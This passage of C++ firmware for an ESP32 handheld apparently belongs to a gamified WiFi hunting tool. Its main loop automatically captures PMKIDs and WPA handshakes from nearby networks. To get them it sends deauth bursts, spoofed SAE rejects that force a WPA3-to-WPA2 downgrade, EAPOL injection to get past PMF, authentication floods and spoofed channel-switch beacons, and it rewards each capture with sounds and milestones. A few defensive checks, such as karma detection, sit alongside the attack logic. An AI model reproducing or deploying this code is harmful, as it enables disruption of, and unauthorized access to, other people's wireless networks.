        SFX::play(SFX::PMKID);     // quick double-tap
        Haptic::pulse();            // strong PMKID vibration
        M5.Power.setLed(true);     // LED flash for PMKID
        ledOffTime = now + LED_FLASH_PMKID;    // brief flash
    } else if (pendingDeauthBeep) {
        pendingDeauthBeep = false;
        SFX::play(SFX::DEAUTH);  // low kick drum punch
        Haptic::tick();            // micro deauth feedback
    } else if (pendingEAPOLTick > 0) {
        // progressive ticks for M1/M2/M3 (M4 handled separately with jackpot)
        uint8_t m = pendingEAPOLTick;
        pendingEAPOLTick = 0;
        switch (m) {
            case 1: SFX::play(SFX::EAPOL_M1); break;  // single tick
            case 2: SFX::play(SFX::EAPOL_M2); break;  // double tick
            case 3: SFX::play(SFX::EAPOL_M3); break;  // triple tick
            // M4 = EAPOL_M4 triggered by pendingHandshakeBeep
        }
    }
    // LED auto-off after flash duration
    if (ledOffTime > 0 && TimeMath::reached(now, ledOffTime)) {
        M5.Power.setLed(false);
        ledOffTime = 0;
    }

    // ==[ DEFERRED CALLBACK OPS ]== process staged data from promiscuous callback

    // Beacon PSRAM free (LRU eviction)
    drainBeaconFrees();

    // Beacon PSRAM alloc + copy
    if (pendingBeacon.ready.load(std::memory_order_acquire)) {
        uint16_t bi = hashFindNetwork(pendingBeacon.bssid);
        if (bi != HUNT_HASH_EMPTY && networks[bi].beaconLen == 0) {
            networks[bi].beaconFrame = (uint8_t*)heap_caps_malloc(
                pendingBeacon.len, MALLOC_CAP_SPIRAM);
            if (networks[bi].beaconFrame) {
                memcpy(networks[bi].beaconFrame, pendingBeacon.data, pendingBeacon.len);
                networks[bi].beaconLen = pendingBeacon.len;
            }
        }
        pendingBeacon.ready.store(false, std::memory_order_release);
    }

    // ==[ DEFERRED MOOD/AVATAR OPS ]== callback staged flags, safe to run here

    // New network → Mood phrase + wave ripple
    if (pendingNewNetwork) {
        pendingNewNetwork = false;
        Mood::onNewNetwork();
        Avatar::waveRipple(WaveMode::INCOMING);
    }

    // New network SSID overlay (rare, 1-in-15)
    if (pendingNewNetworkSSID.load(std::memory_order_acquire)) {
        if (Mood::hasPhrase()) {
            // Lock, copy to local buffer, unlock — prevents seeing torn writes
            char localSSID[16];
            portENTER_CRITICAL(&pendingSSIDMux);
            memcpy(localSSID, (const void*)pendingSSIDBuf, sizeof(localSSID));
            pendingNewNetworkSSID.store(false, std::memory_order_release);
            portEXIT_CRITICAL(&pendingSSIDMux);
            Mood::setPhrase(localSSID, AvatarState::HUNTING);
        } else {
            pendingNewNetworkSSID.store(false, std::memory_order_release);
        }
    }

    // Commit deferred client-adds from EAPOL callback (core 0 → core 1 handoff)
    drainPendingClients();

    // New client spotted (SFX + phrase + sniff)
    if (pendingClientSpotted) {
        pendingClientSpotted = false;
        Mood::onClientSpotted();
    }

    // Handshake progress M1234 display — snapshot payload under mux BEFORE
    // clearing the flag. otherwise a callback firing between clear and read
    // can tear the 33-byte pendingHSSSID mid-memcpy.
    if (pendingHSProgress) {
        uint8_t mask;
        char ssid[33];
        portENTER_CRITICAL(&pendingHSMux);
        mask = pendingHSMask;
        memcpy(ssid, (const void*)pendingHSSSID, sizeof(ssid));
        pendingHSProgress = false;
        portEXIT_CRITICAL(&pendingHSMux);
        Mood::onHandshakeProgress(mask, ssid);
    }

    // "NEED M2" warnings (uncrackable pair detected)
    if (pendingNeedM2 > 0) {
        uint8_t which = pendingNeedM2;
        pendingNeedM2 = 0;
        Mood::setPhrase(which == 1 ? "M3+M4 NEED M2!" : "M1+M4 NEED M2!", AvatarState::SAD);
    }

    // M2 retry clear
    if (pendingClearRetry) {
        uint8_t retryBSSID[6];
        uint8_t retryStation[6];
        memcpy(retryBSSID, (const void*)pendingClearRetryBSSID, sizeof(retryBSSID));
        memcpy(retryStation, (const void*)pendingClearRetryStation, sizeof(retryStation));
        pendingClearRetry = false;
        clearRetryForClient(retryBSSID, retryStation);
    }

    // D-UCB partial reward
    if (pendingPartialReward) {
        uint8_t partialChannel;
        float partialBonus;
        portENTER_CRITICAL(&pendingPartialMux);
        partialChannel = pendingPartialChannel;
        partialBonus = pendingPartialBonus;
        pendingPartialReward = false;
        portEXIT_CRITICAL(&pendingPartialMux);
        recordPartialReward(partialChannel, partialBonus);
    }

    // PMKID capture (PSRAM + NVS + Mood + SFX)
    if (pendingPMKID.ready.load(std::memory_order_acquire)) {
        // ==[ SNAPSHOT BEFORE CLEAR ]== once ready=false, Core-0 callback is free
        // to overwrite bssid/station/pmkidBytes/isFirstCapture with a new PMKID.
        // copy all consumer-side fields to locals, THEN release the slot.
        uint8_t pmkBssid[6], pmkStation[6], pmkBytes[16];
        bool pmkIsFirst;
        memcpy(pmkBssid, pendingPMKID.bssid, 6);
        memcpy(pmkStation, pendingPMKID.station, 6);
        memcpy(pmkBytes, pendingPMKID.pmkidBytes, 16);
        pmkIsFirst = pendingPMKID.isFirstCapture;
        pendingPMKID.ready.store(false, std::memory_order_release);

        // compute lifetime count here (Config reads are main-loop safe)
        uint32_t lt = Config::getTotalPMKIDs() + Config::getTotalHandshakes() + 1;
        uint16_t pmkTotalLife = (lt > 65535) ? 65535 : (uint16_t)lt;

        // rebuild full struct in main loop where I2C/PSRAM are safe
        CapturedPMKID capture;
        memcpy(capture.bssid, pmkBssid, 6);
        memcpy(capture.station, pmkStation, 6);
        // look up SSID from networks[] via hash (avoids 33-byte copy in staging struct)
        capture.ssid[0] = '\0';
        uint16_t pi = hashFindNetwork(pmkBssid);
        if (pi != HUNT_HASH_EMPTY) {
            strncpy(capture.ssid, networks[pi].ssid, 32);
            capture.ssid[32] = '\0';
        }
        memcpy(capture.pmkid, pmkBytes, 16);
        capture.timestamp = getCurrentEpoch();  // safe here (I2C ok in main loop)
        capture.synced = false;

        if (Capture::addPMKID(&capture)) {
            Config::incrementTotalPMKIDs();
            Config::incrementSessionPMKIDCount();
            recordChannelReward(currentChannel);
            // capture type collection: first-discovery event
            if (pi != HUNT_HASH_EMPTY) {
                uint8_t authType = (uint8_t)networks[pi].authmode;
                if (Config::markAuthTypeSeen(authType)) {
                    Mood::onFirstDiscovery(authType);
                }
            }
            Mood::onPMKID();  // attackHop + tailWiggle fired inside
            Avatar::waveRipple(WaveMode::OUTGOING, 4);
            Avatar::dropFruit();

            // combo pitch escalation: captures within 60s window
            if (now - lastCaptureTime < COMBO_WINDOW && lastCaptureTime > 0) {
                captureComboCount++;
            } else {
                captureComboCount = 1;
            }
            lastCaptureTime = now;
            float combo = powf(COMBO_PITCH_BASE, captureComboCount - 1);
            if (combo > COMBO_PITCH_MAX) combo = COMBO_PITCH_MAX;
            SFX::setComboPitch(combo);

            // LURK exit: target captured, mission complete
            if (currentBehavior == HuntBehavior::LURK) {
                exitLurk();
                switchBehavior(HuntBehavior::CAMP);
            }

            if (pmkIsFirst) {
                Mood::onFirstCapture();
                SFX::play(SFX::FIRST_CATCH);
            }
            if (pmkTotalLife > 0 && pmkTotalLife % 10 == 0) {
                SFX::play(SFX::MILESTONE);
            }

            // lifetime capture milestones
            uint32_t totalLife = Config::getTotalPMKIDs() + Config::getTotalHandshakes();
            if (totalLife == 10 || totalLife == 25 || totalLife == 50 ||
                totalLife == 100 || totalLife == 250 || totalLife == 500 ||
                totalLife == 1000) {
                Mood::onMilestone(networkCount, (int)totalLife);
            }
        }
    }

    // ==[ SAE DOWNGRADE ]== spoofed reject to force WPA2 fallback
    // 500ms cooldown per reject to avoid flooding (client needs time to retry + give up)
    if (pendingSAEReject.ready.load(std::memory_order_acquire)) {
        uint8_t rejectBSSID[6];
        uint8_t rejectClient[6];
        uint8_t rejectAuthSeq = pendingSAEReject.authSeq;
        memcpy(rejectBSSID, pendingSAEReject.bssid, sizeof(rejectBSSID));
        memcpy(rejectClient, pendingSAEReject.client, sizeof(rejectClient));
        pendingSAEReject.ready.store(false, std::memory_order_release);
        uint32_t now_sae = millis();
        if (now_sae - lastSAERejectTime > SAE_REJECT_COOLDOWN_MS) {
            lastSAERejectTime = now_sae;
            // Send reject twice — race the real AP's response
            WSLBypasser::sendSAEReject(rejectBSSID, rejectClient, rejectAuthSeq);
            WSLBypasser::sendSAEReject(rejectBSSID, rejectClient, rejectAuthSeq);
            Mood::onSAEReject();
        }
    }

    // pump SFX state machine every frame
    SFX::update();
    
    // ==[ PROBE-VULN CROSS-REFERENCE ]== check harvested probes against potfile
    // Throttled to every 2s — Potfile::isKnown() reads SPIFFS index (safe in main loop, not callback)
    {
        static uint32_t lastProbeVulnCheck = 0;
        if (harvestedProbes && harvestedCount > 0 && now - lastProbeVulnCheck > PROBE_VULN_CHECK_INTERVAL) {
            lastProbeVulnCheck = now;
            for (int i = 0; i < harvestedCount; i++) {
                if (harvestedProbes[i].ssid[0] && Potfile::isKnown(harvestedProbes[i].ssid)) {
                    DefensePipeline::cacheProbeVulnMatch(harvestedProbes[i].clientMac,
                                               harvestedProbes[i].ssid,
                                               harvestedProbes[i].rssi);
                }
            }
        }
    }

    // ==[ PROBE-RESPONSE KARMA CHECK ]== same BSSID claiming 3+ SSIDs in probe responses
    // O(n²) single-pass per BSSID with early-exit at 3 distinct SSIDs
    if (pendingKarmaCheck) {
        pendingKarmaCheck = false;
        uint8_t count = karmaRingCount;
        if (count >= 3) {
            uint8_t checkedBSSIDs[KARMA_RING_SIZE][6];
            uint8_t checkedCount = 0;
            bool detected = false;

            for (uint8_t i = 0; i < count && !detected; i++) {
                if (karmaRing[i].ssid[0] == '\0') continue;

                // skip BSSIDs we already scanned
                bool alreadyChecked = false;
                for (uint8_t c = 0; c < checkedCount; c++) {
                    if (memcmp(checkedBSSIDs[c], karmaRing[i].bssid, 6) == 0) {
                        alreadyChecked = true;
                        break;
                    }
                }
                if (alreadyChecked) continue;
                memcpy(checkedBSSIDs[checkedCount++], karmaRing[i].bssid, 6);

                // collect distinct SSIDs for this BSSID
                const char* seen[KARMA_RING_SIZE];
                uint8_t distinctSSIDs = 1;
                seen[0] = karmaRing[i].ssid;

                for (uint8_t j = i + 1; j < count; j++) {
                    if (karmaRing[j].ssid[0] == '\0') continue;
                    if (memcmp(karmaRing[i].bssid, karmaRing[j].bssid, 6) != 0) continue;
                    bool dup = false;
                    for (uint8_t s = 0; s < distinctSSIDs; s++) {
                        if (strcmp(karmaRing[j].ssid, seen[s]) == 0) { dup = true; break; }
                    }
                    if (!dup) {
                        seen[distinctSSIDs++] = karmaRing[j].ssid;
                        if (distinctSSIDs >= 3) break;
                    }
                }

                if (distinctSSIDs >= 3) {
                    char detail[48];
                    snprintf(detail, sizeof(detail), "+%d SSIDs (probeResp)", distinctSSIDs - 1);
                    DefensePipeline::reportKarmaFromProbeResponse(karmaRing[i].ssid, detail);
                    karmaRingCount = 0;
                    karmaRingHead = 0;
                    detected = true;
                }
            }
        }
    }

    // ==[ BEHAVIOR TICK ]== update motion-aware persona (throttled to tick cadence)
    if (Config::getAdaptiveHunt()) {
        static uint32_t lastBehaviorTick = 0;
        if (now - lastBehaviorTick >= getTickMs()) {
            lastBehaviorTick = now;
            updateBehavior();
        }
    }
    
    // ==[ PENDING CLEANUP ]==
    cleanupStalePending();
    
    // ==[ DEAD AIR ]==
    checkDeadAir();
    
    // ==[ PARTIAL RETRY QUEUE ]== if M1-only, throw another mudball
    if (deauthState == DeauthState::IDLE && probeState == ProbeState::IDLE) {
        processRetryQueue();
    }
    
    // ==[ PROBE STATE MACHINE ]==
    switch (probeState) {
        case ProbeState::IDLE:
        {
            // suppress probes during post-deauth dwell — keep the air quiet for M2 capture
            bool inDwell = (now - postDeauthDwellStart < DEAUTH_DWELL_EXTENSION);
            bool canProbe = (deauthState == DeauthState::IDLE) && !inDwell;
            if (canProbe && Config::getAutoProbe() &&
                now - lastProbeTime > getProbeInterval()) {
                if (selectProbeTarget(true)) {  // current channel only — no hop
                    probeState = ProbeState::TUNING;
                    probeStateTimer = now;
                }
            }
        }
            break;

        case ProbeState::TUNING:
            // target on current channel (sameChannelOnly=true) — no hop needed
            probeState = ProbeState::AUTHING;
            probeStateTimer = now;
            break;

        case ProbeState::AUTHING:
            // ==[ AUTH BEFORE ASSOC ]== 802.11 requires Open System auth before association.
            // without this, AP drops our assoc req as Class 2 frame. no auth = no PMKID.
            if (now - probeStateTimer > CHANNEL_SETTLE) {
                if (probeTarget != nullptr) {
                    WSLBypasser::randomizeMAC();
                    authResponseReceived = false;
                    WSLBypasser::sendAuthentication(probeTarget->bssid);
                }
                probeStateTimer = now;
                // wait for auth response or timeout
                probeState = ProbeState::SENDING;
            }
            break;

        case ProbeState::SENDING:
            // wait for auth response from AP (Open System seq 2)
            if (authResponseReceived) {
                // AP accepted. send association request for PMKID.
                if (probeTarget != nullptr) {
                    WSLBypasser::sendAssociationRequest(
                        probeTarget->bssid,
                        probeTarget->ssid
                    );
                    probeCount++;
                    Mood::onProbeAttempt();
                    Avatar::waveRipple(WaveMode::OUTGOING, 2);
                }

                pmkidExtracted = false;
                probeState = ProbeState::WAITING;
                probeStateTimer = now;
            } else if (now - probeStateTimer > AUTH_WAIT) {
                // auth timed out — AP didn't respond. skip to idle.
                if (probeTarget != nullptr) {
                    probeTarget->probeAttempts++;
                    probeTarget->lastProbeTime = now;
                    Mood::onProbeFail();
                }
                lastProbeTime = now;
                probeState = ProbeState::IDLE;
                probeTarget = nullptr;
            }
            break;
            
        case ProbeState::WAITING:
            // Wait for response or timeout
            if (pmkidExtracted || now - probeStateTimer > PROBE_WINDOW) {
                if (probeTarget != nullptr) {
                    probeTarget->probeAttempts++;
                    probeTarget->lastProbeTime = now;

                    if (pmkidExtracted) {
                        probeTarget->gotPMKIDResponse = true;  // terminal — no more probes
                    } else if (probeTarget->gotResponse) {
                        // anti-farm: only award probe XP once per network per session
                        if (!probeTarget->probeXPAwarded) {
                            probeTarget->probeXPAwarded = true;
                            Mood::onProbeSuccess();
                        }
                    } else {
                        Mood::onProbeFail();
                    }
                }

                lastProbeTime = now;
                probeState = ProbeState::IDLE;
                probeTarget = nullptr;
            }
            break;
            
        default:
            probeState = ProbeState::IDLE;
            break;
    }
    
    // === DEAUTH STATE MACHINE (MUDBALL) ===
    // Always run — pig reacts to clients regardless of deauth config.
    // Config::getDeauthEnabled() gates only the actual frame TX in THROWING.
    {
        switch (deauthState) {
            case DeauthState::IDLE:
                // hunt for deauth targets when probe is idle; PATROL only hits strong signals
                if (probeState == ProbeState::IDLE &&
                    now - lastDeauthTime > getDeauthInterval()) {
                    if (selectDeauthTarget()) {
                        deauthState = DeauthState::TARGETING;
                        deauthStateTimer = now;
                    }
                }
                break;

            case DeauthState::TARGETING:
                // target on current channel — no hop needed
                if (deauthTarget != nullptr) {
                    Mood::onClientSpotted();
                    if (Avatar::isTreeVisible()) {
                        Avatar::attackTree();
                    }
                    deauthState = DeauthState::THROWING;
                    deauthStateTimer = now;
                } else {
                    // safety: no target, abort cycle
                    deauthState = DeauthState::IDLE;
                }
                break;

            case DeauthState::THROWING:
                // settle channel, then MUDBALL — capture-focused, every cycle aims for handshake
                // ==[ TIERED ATTACK ]== Tier 1: deauth (non-PMF) | Tier 2: EAPOL injection (PMF) | Tier 3: auth flood (last resort)
                if (now - deauthStateTimer > CHANNEL_SETTLE) {
                    if (deauthTarget != nullptr) {
                        // ==[ TARGET SNAPSHOT ]== deauthTarget points into networks[], which the
                        // Core-0 callback can LRU-evict (findOrCreateNetwork → memset) during any
                        // huntBusy-released TX window below. Without a snapshot, a concurrent beacon
                        // could repopulate the slot with a different AP mid-attack — we would then
                        // TX at an unintended BSSID / wrong client list. Copy what we need once.
                        DetectedNetwork tgt;
                        memcpy(&tgt, deauthTarget, sizeof(DetectedNetwork));
                        tgt.beaconFrame = nullptr;  // do not alias PSRAM ptr from snapshot

                        uint8_t clientsHit = 0;
                        uint8_t maxClients = (currentBehavior == HuntBehavior::LURK) ? DEAUTH_MAX_CLIENTS_LURK :
                                             (currentBehavior == HuntBehavior::CAMP) ? DEAUTH_MAX_CLIENTS_CAMP : DEAUTH_MAX_CLIENTS_DEFAULT;
                        // crowd restraint: reduce exposure in dense RF environments
                        if (DefensePipeline::snapshot().isCrowded() && maxClients > 1) maxClients--;
                        bool targetHasPMF = tgt.hasPMF;

                        for (uint8_t c = 0; c < tgt.clientCount && clientsHit < maxClients; c++) {
                            if (!isEligibleForDeauth(&tgt, c)) continue;

                            const DetectedClient& client = tgt.clients[c];

                            if (clientsHit == 0) {
                                Mood::onDeauth(tgt.ssid);
                                Avatar::waveRipple(WaveMode::OUTGOING);
                                pendingDeauthBeep = true;
                            }

                            // ==[ UNLOCK DURING TX ]== release huntBusy so callback can
                            // process beacons/EAPOL while we queue TX frames. The burst
                            // calls are synchronous (block until queued) and can take ms.
                            huntBusy.store(false, std::memory_order_release);

                            if (targetHasPMF && Config::getEAPOLInjectionEnabled()) {
                                // ==[ TIER 2: EAPOL INJECTION ]== PMF bypass. data frames ignore 802.11w.
                                WSLBypasser::sendEAPOLStart(tgt.bssid, client.mac);
                                WSLBypasser::sendEAPOLLogoff(tgt.bssid, client.mac);
                                lastAttackTier = 1;
                            } else if (Config::getDeauthEnabled()) {
                                // ==[ TIER 1: DEAUTH ]== standard management frame attack (non-PMF only)
                                uint8_t burstCount = getDeauthBurstCount(client);

                                if (Config::getDeauthAggressive()) {
                                    WSLBypasser::sendBidirectionalDeauthBurst(tgt.bssid, client.mac, burstCount, DEAUTH_AGGRESSIVE_INTERVAL);
                                } else {
                                    WSLBypasser::sendDeauthBurst(tgt.bssid, client.mac, burstCount, DEAUTH_NORMAL_INTERVAL);
                                }
                                lastAttackTier = 0;
                            }

                            // re-acquire lock for state machine bookkeeping
                            huntBusy.store(true, std::memory_order_release);

                            deauthCount++;
                            markAsDeauthed(tgt.bssid, client.mac);
                            clientsHit++;
                        }

                        // ==[ TIER 3: AUTH FLOOD ]== last resort when no clients eligible for tier 1/2
                        if (Config::getAuthFloodEnabled() && clientsHit == 0) {
                            huntBusy.store(false, std::memory_order_release);
                            WSLBypasser::sendAuthFlood(tgt.bssid, AUTH_FLOOD_COUNT, AUTH_FLOOD_INTERVAL);
                            huntBusy.store(true, std::memory_order_release);
                            lastAttackTier = 2;
                            deauthCount++;
                        }

                        // ==[ CSA HERD ]== spoofed CSA beacon to herd clients OFF the AP's channel.
                        // clients switch to a bogus channel, find nothing, scan, reconnect on
                        // the real channel → fresh 4-way handshake we capture.
                        if (Config::getCSAEnabled() && clientsHit > 0) {
                            uint8_t disruptCh = csaDisruptChannel(tgt.channel);
                            huntBusy.store(false, std::memory_order_release);
                            WSLBypasser::sendCSABeacon(tgt.bssid, tgt.ssid,
                                                       tgt.channel, disruptCh, CSA_BEACON_COUNT_INITIAL);
                            huntBusy.store(true, std::memory_order_release);
                        }

#if HAMLET_DEBUG_LOG
                        deauthClientsSent += clientsHit;
#endif
                        HAMLET_LOGF("[DEAUTH] THROWING done: clientsHit=%d tier=%d ssid=%s\n",
                                      clientsHit, lastAttackTier, tgt.ssid);

                        if (clientsHit > 0) {
                            Mood::onCatching(tgt.ssid);
                        }

                        // ==[ FIRE-AND-FORGET ]== no channel lock. extend dwell by 5s,
                        // then resume hopping. client reconnects → caught this dwell or next visit.
                        // this maximizes total listening time across ALL channels.
                        HAMLET_LOGF("[DEAUTH] dwell ch%d for %ums (listening for M2)\n",
                                      (int)currentChannel, DEAUTH_DWELL_EXTENSION);
                        postDeauthDwellStart = now;
                        lastHopTime = now;
                        lastDeauthTime = now;
                        deauthState = DeauthState::IDLE;
                        deauthTarget = nullptr;
                    } else {
                        // safety: target lost (eviction or race), abort cycle
                        deauthState = DeauthState::IDLE;
                        deauthTarget = nullptr;
                    }
                }
                break;

            default:
                deauthState = DeauthState::IDLE;
                break;
        }
    }
    
    // === Channel Hopping ===
    if (probeState == ProbeState::IDLE && deauthState == DeauthState::IDLE) {
        // post-deauth dwell: stay on channel to catch handshake M2 (~50-200ms)
        if (now - postDeauthDwellStart < DEAUTH_DWELL_EXTENSION) {
            // dwelling — don't hop
        } else if (now - lastHopTime > getAdaptiveHopDelay()) {
            hopToNextChannel();
            lastHopTime = now;
        }
    }
    
    // ==[ RELEASE RACE LOCK ]==
    huntBusy.store(false, std::memory_order_release);
}

void togglePause() {
    paused = !paused;
}

bool isPaused() { return paused; }
bool isActive() { return active; }
bool isChannelHopping() { return active && channelHopping; }
uint8_t getCaptureComboCount() { return captureComboCount; }
uint8_t getCurrentChannel() { return currentChannel; }
const uint8_t* getCurrentTargetBSSID() { return deauthTarget ? deauthTarget->bssid : nullptr; }
uint16_t getNetworkCount() { return networkCount; }

uint16_t getActiveNetworkCount() {
    // Count networks seen within motion-adaptive timeout
    uint16_t count = 0;
    uint32_t now = millis();
    // Behavior-specific timeout: CAMP/LURK=30s, PATROL=10s, SPRINT=5s
    uint32_t activeTimeout;
    if (currentBehavior == HuntBehavior::CAMP || currentBehavior == HuntBehavior::LURK) {
        activeTimeout = ACTIVE_TIMEOUT_CAMP;
    } else if (currentBehavior == HuntBehavior::SPRINT) {
        activeTimeout = ACTIVE_TIMEOUT_SPRINT;
    } else {
        activeTimeout = ACTIVE_TIMEOUT_PATROL;
    }
    for (uint16_t i = 0; i < networkCount; i++) {
        if (now - networks[i].lastSeen < activeTimeout) {
            count++;
        }
    }
    return count;
}

uint16_t getClientCount() {
    uint16_t total = 0;
    for (uint16_t i = 0; i < networkCount; i++) {
        total += networks[i].clientCount;
    }
    return total;
}

uint16_t getSessionPMKIDs() { return sessionPMKIDs; }
uint16_t getSessionHandshakes() { return sessionHandshakes; }

const DetectedNetwork* getNetworks() { return networks; }

ProbeState getProbeState() { return probeState; }
uint16_t getProbeCount() { return probeCount; }

DeauthState getDeauthState() { return deauthState; }
uint16_t getDeauthCount() { return deauthCount; }
uint8_t getLastAttackTier() { return lastAttackTier; }

HuntBehavior getCurrentBehavior() { return currentBehavior; }

uint16_t getHarvestedCount() { return harvestedCount; }
uint16_t getTotalProbeRequests() { return totalProbeRequests; }
const Hunt::HarvestedProbe* getHarvestedProbes() { return harvestedProbes; }

const ChannelStats* getChannelStats(uint8_t channel) {
    if (channel < 1 || channel > 13) return nullptr;
    return &channelStats[channel];
}

void resetDUCB() {
    // nuclear option: clear D-UCB learning (RAM only; NVS stats survive). fresh pig brain
    memset(channelArms, 0, sizeof(channelArms));
    totalDPulls = 0.0f;
    channelFirstReward = 0;
    ducbTLocal = 0;
    noveltyNovel = 0;
    noveltyTotal = 0;
    lastNoveltyCheck = 0;
    burstNewCount = 0;
    burstWindowStart = 0;
}

DUCBStats getDUCBStats(uint8_t channel, HuntBehavior /*mode*/) {
    // unified arms — mode param kept for API compat but ignored
    DUCBStats stats = {0, 0, 0.0f};
    if (channel < 1 || channel > 13) return stats;
    stats.pulls = (uint16_t)channelArms[channel].dPulls;
    stats.rewards = (uint16_t)channelArms[channel].dRewards;
    stats.avgReward = (channelArms[channel].dPulls > DUCB_MIN_DPULLS)
                      ? channelArms[channel].dRewards / channelArms[channel].dPulls : 0.0f;
    return stats;
}

uint32_t getDUCBTotalPulls(HuntBehavior /*mode*/) {
    return (uint32_t)totalDPulls;
}

uint16_t getDUCBTotalRewards(HuntBehavior /*mode*/) {
    float total = 0.0f;
    for (uint8_t ch = 1; ch <= 13; ch++) {
        total += channelArms[ch].dRewards;
    }
    return (uint16_t)total;
}

// === Private Functions ===

static bool initWiFiPromiscuous() {
    // Recon leaves the WiFi driver initialized after WiFi.mode(OFF). Re-init without
    // deinit corrupts heap/coex and can brownout-reset the board on hunt entry.
    wifi_mode_t existingMode = WIFI_MODE_NULL;
    bool driverReady = (esp_wifi_get_mode(&existingMode) == ESP_OK);
    if (!driverReady) {
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        // ==[ BUFFER TUNING ]== balance RX capture vs TX injection.
        // RX needs enough buffers for burst traffic (beacons, EAPOL), but hogging
        // all heap starves TX — esp_wifi_80211_tx returns ESP_ERR_NO_MEM (0x101).
        cfg.static_rx_buf_num = 12;    // default 10 → 12 (modest boost, saves DRAM for TX)
        cfg.dynamic_rx_buf_num = 32;   // keep default — 64 was starving TX path
        cfg.dynamic_tx_buf_num = 32;   // explicit default — ensure TX has buffer pool
        esp_err_t ierr = esp_wifi_init(&cfg);
        if (ierr != ESP_OK) {
            HAMLET_LOGF("[HUNT] esp_wifi_init failed: %s\n", esp_err_to_name(ierr));
            return false;
        }
    }

    esp_wifi_set_mode(WIFI_MODE_APSTA);  // AP+STA mode allows WIFI_IF_AP TX during promiscuous
    
    // Configure AP with minimal settings - channel will follow promiscuous
    wifi_config_t ap_config = {};  // zero-init covers ssid, ssid_len
    ap_config.ap.channel = 1;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.ssid_hidden = 1;
    ap_config.ap.max_connection = 0;  // No connections
    ap_config.ap.beacon_interval = AP_BEACON_INTERVAL;  // Minimal beacons
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    
    esp_err_t err = esp_wifi_start();
    if (err != ESP_OK) {
        HAMLET_LOGF("[HUNT] esp_wifi_start failed: %s\n", esp_err_to_name(err));
        wifiInitOK = false;
        active = false;
        return false;
    }

    wifiInitOK = true;

    // Cache the AP MAC for fast filtering in the callback.
    ourApMacValid = (esp_wifi_get_mac(WIFI_IF_AP, ourApMac) == ESP_OK);

    // ==[ POWER SAVE OFF ]== promiscuous capture needs continuous RX — no modem sleep.
    // MUST be set AFTER esp_wifi_start() and BEFORE enabling promiscuous mode.
    // Without this, the radio sleeps between DTIM beacons and drops EAPOL frames.
    // coex constraint: BLE active → WIFI_PS_NONE crashes (must use MIN_MODEM).
    Power::applyCurrentRadioSettings();

    // set filter + callback BEFORE enabling promiscuous — no unfiltered frame window
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);

    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        HAMLET_LOGF("[HUNT] esp_wifi_set_promiscuous failed: %s\n", esp_err_to_name(err));
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_stop();
        wifiInitOK = false;
        return false;
    }

    err = esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        HAMLET_LOGF("[HUNT] channel set ch1 failed: 0x%x\n", err);
    } else {
        currentChannel = 1;
    }
    return true;
}

static void stopWiFiPromiscuous() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_stop();
}

// clamp01 defined earlier (line ~220)

static void applyReconPrior() {
    if (!Config::getIppEnabled()) return;

    bool applied = false;

    // ==[ PRIMARY: Spectrum channel data ]== detailed per-channel activity
    if (Spectrum::hasReconData()) {
        uint32_t reconStamp = Spectrum::getReconLastUpdateMs();
        uint32_t now = millis();
        if (reconStamp > 0 && now - reconStamp <= RECON_MAX_AGE_MS &&
            lastReconAppliedMs != reconStamp) {

            uint16_t activity[13] = {0};
            uint32_t timeMs[13] = {0};
            uint16_t networks[13] = {0};
            int8_t peakRssi[13] = {0};
            uint16_t attackable[13] = {0};
            Spectrum::getReconChannelData(activity, timeMs, networks, peakRssi, attackable);

            for (uint8_t ch = 1; ch <= 13; ch++) {
                uint8_t idx = ch - 1;
                if (timeMs[idx] == 0) continue;

                float attackNorm = clamp01(attackable[idx] / RECON_ATTACKABLE_SCALE);
                float actNorm = clamp01(activity[idx] / RECON_ACTIVITY_SCALE);
                float netNorm = clamp01(networks[idx] / RECON_NETWORK_SCALE);
                float score = 0.5f * attackNorm + 0.3f * actNorm + 0.2f * netNorm;

                uint16_t reward = (uint16_t)(score * RECON_PRIOR_PULLS);
                if (reward == 0) continue;

                channelArms[ch].dPulls += (float)RECON_PRIOR_PULLS;
                channelArms[ch].dRewards += (float)reward;
                totalDPulls += (float)RECON_PRIOR_PULLS;
                applied = true;
            }

            if (applied) lastReconAppliedMs = reconStamp;
        }
    }

    // ==[ FALLBACK: Recon WiFi snapshot ]== background scan AP channel distribution
    if (!applied) {
        const Recon::WifiAP* snap = DefensePipeline::snapshot().getWifiSnapshot();
        int snapCount = DefensePipeline::snapshot().getWifiSnapshotCount();
        if (snapCount > 0) {
            // build channel histogram: count attackable APs per channel
            uint8_t chCount[14] = {0};
            int16_t chQuality[14] = {0};
            for (int i = 0; i < snapCount; i++) {
                uint8_t ch = snap[i].channel;
                if (ch < 1 || ch > 13) continue;
                // skip open/WEP — can't yield PMKIDs/handshakes
                if (snap[i].authMode <= 1) continue;  // OPEN=0, WEP=1
                chCount[ch]++;
                chQuality[ch] += (100 + snap[i].rssi);  // higher = more signal
            }

            for (uint8_t ch = 1; ch <= 13; ch++) {
                if (chCount[ch] == 0) continue;
                float netNorm = clamp01(chCount[ch] / 10.0f);
                float qualNorm = clamp01(chQuality[ch] / (chCount[ch] * 50.0f));
                float score = 0.6f * netNorm + 0.4f * qualNorm;

                uint16_t reward = (uint16_t)(score * RECON_PRIOR_PULLS);
                if (reward == 0) continue;

                channelArms[ch].dPulls += (float)RECON_PRIOR_PULLS;
                channelArms[ch].dRewards += (float)reward;
                totalDPulls += (float)RECON_PRIOR_PULLS;
                applied = true;
            }
        }
    }

    // ==[ DEAUTH AVOIDANCE ]== penalize channels with recent deauth bursts
    if (applied) {
        const Recon::DeauthBurstRecord* bursts = DefensePipeline::snapshot().getDeauthBurstHistory();
        uint8_t burstCount = DefensePipeline::snapshot().getDeauthBurstHistoryCount();
        uint32_t now = millis();
        for (uint8_t b = 0; b < burstCount; b++) {
            if (now - bursts[b].timestamp > 300000) continue;  // only last 5min
            // skip bursts correlated with our own MUDBALL — not contested air
